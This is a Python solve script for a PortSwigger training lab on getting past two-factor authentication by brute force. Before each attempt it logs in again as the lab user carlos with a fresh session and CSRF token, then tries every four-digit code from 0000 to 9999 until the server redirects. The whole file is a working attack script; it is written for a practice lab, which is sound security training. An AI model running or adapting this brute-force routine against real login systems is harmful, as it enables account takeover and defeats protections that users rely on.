#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
2FA bypass using a brute-force attack.

Replicates the Burp Macro approach: re-logs in as carlos before each
2FA attempt to get a fresh session, then tries every code 0000-9999.
"""

import argparse
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_csrf(session: requests.Session, url: str) -> str:
    r = session.get(url)
    m = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if not m:
        raise SystemExit("[-] CSRF token not found")
    return m.group(1)


def login(lab: str, username: str, password: str) -> requests.Session:
    s = requests.Session()
    s.verify = False
    csrf = get_csrf(s, f"{lab}/login")
    s.post(
        f"{lab}/login",
        data={"csrf": csrf, "username": username, "password": password},
        allow_redirects=False
    )
    return s


def try_code(session: requests.Session, lab: str, code: str) -> bool:
    csrf = get_csrf(session, f"{lab}/login2")
    r = session.post(
        f"{lab}/login2",
        data={"csrf": csrf, "mfa-code": code},
        allow_redirects=False
    )
    return r.status_code == 302


def main():
    parser = argparse.ArgumentParser(
        description="Solve Authentication Lab 14 (2FA brute-force via macro)"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("--username", default="carlos")
    parser.add_argument("--password", default="montoya")
    parser.add_argument("--start", type=int, default=0)
    parser.add_argument("--end", type=int, default=9999)
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")

    print(f"[*] Brute-forcing 2FA for {args.username} ({args.start:04d}–{args.end:04d})...")
    for n in range(args.start, args.end + 1):
        code = f"{n:04d}"
        s = login(lab, args.username, args.password)
        if try_code(s, lab, code):
            print(f"[+] Correct code: {code}")
            print("[+] Lab solved.")
            return
        if n % 100 == 0:
            print(f"[*] Tried up to {code}...")

    print("[-] Code not found in range")


if __name__ == "__main__":
    main()
